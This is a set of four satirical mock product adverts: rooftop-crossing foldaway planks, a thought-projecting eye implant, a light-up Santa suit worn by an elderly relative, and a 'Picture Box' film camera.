No need to spend months in training and age is not a barrier with these handy foldaway planks of wood. Just head up to the roof of your building, unfold them to the length of the space you need to traverse and off you go.\nFully adjustable you will be able to travel a distance of up to 20 meters. The complete kit comes with a handy foldaway parachute for those extra windy days, and a neat little canvas bag for when they're not in use. Each plank is treated with a special non-slip coating to give extra strength and durability. We do recommend not wearing flip-flops or any other open-toe shoes while in use.\nBe the adventurer you've always wanted to be, but do it safely. T&C's apply, third-party insurance recommended, use at the owners own risk.                                                                                                                                                                                                                                                                                    |

Do you lack the imagination to describe what you've seen? With extensive research and exhaustive trials our team of Ophthalmologists, and techy peeps, have made it possible for you to share everything that is going on inside your head.\nIf you think laser eye surgery is advanced you haven't seen anything yet. A small implant behind the lens of your eyes links to the thalamus and cortex, transmitting images that can be projected in the blink of an eye.\nWith sufficient training, it is even possible for you to learn to sleep with your eyes open. Then you can entertain family and friends to a unique movie night like they have never experienced before. Forget Netflix, no subscription required here.\nThe quality of projected images works better with blue eyes, therefore, we envisage altering most eye colors in order for you to experience the best we know you deserve.\nThe process from start to finish is probably cheaper than you will be expecting. You have nothing to lose by booking a free consultation today.                                                                                                                                                                                                                                                                         |

The need to move your treasured possessions into the attic to make space to decorate is a thing of the past. The full Santa suit complete with decorative lights can be worn by any family member (Grandpa Joe) who isn't usually very mobile. Dress them up and plug them in.\nIf you find you need extra seating as you're entertaining over the festive season Grandpa Joe can be positioned in any area of the house where this is an electrical outlet. Be advised the lights should only be run for a period of one hour during use, with a ten-minute break to avoid overheating. Food and drink must not be consumed while in decoration pose.\nThe suit is fully synthetic and will need regular washing to maintain its fresh festive pine fragrance. This is guaranteed to also free you of the mountain of gifts spilling over your pristine lounge carpet; a crate can be attached to the legs of the suit pants and Grandpa Joe will be able to keep them safe and tidy. Visiting children will be thrilled with your resident Santa as the innovative 'ho ho ho' button positioned discreetly in his hand is activated on shaking.

Here at Picture Box, we have invented something as simple as a box to capture those memories so you can treasure them, and relive them over and over again.\nYes, it really is as simple as a box. We're not sure how it works, but it does. Insert the 35mm negative film, point at your subject and click the button once. You won't see anything right away, not until you have used up all of the film. Once used the film goes to a magic place where people make pictures, the pictures will be of those exact moments when you clicked the button. They will be sent back to you on paper which you can frame, or put into one of our customized Picture Box books.\nAs our product becomes more mainstream we will eventually be able to lower the costs, especially after we upgrade and enhance our Picture Boxes, and release second-generation versions. Once you have had one you will want to be the first to receive any upgrades, we will offer a small discount when you do this. We are anticipating each upgrade will require different negative film sizes, so any you have will no longer work in our new Picture Box versions. Once purchased you can join our mailing list and always be the first to hear news about all our exciting new releases. Happy Snapping. |
